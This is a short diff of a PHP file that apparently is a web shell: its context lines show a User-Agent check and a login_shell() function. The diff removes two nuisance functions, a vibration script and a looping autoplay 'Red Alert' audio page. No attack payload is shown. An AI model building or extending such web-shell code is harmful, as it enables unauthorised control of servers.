@@ -42,14 +42,6 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
         exit;
     }
 }
-function getar() {
-	echo '<script>
-		  window.navigator.vibrate([10, 300, 10]);
-		</script>';
-}
-function alarm() {
-	die("<audio autoplay loop > <source src=\"https://archive.org/download/RedAlert_201904/Red%20Alert.mp3\" type=\"audio/mpeg\"></audio>");
-}
 function login_shell() {
 ?>
 <html>
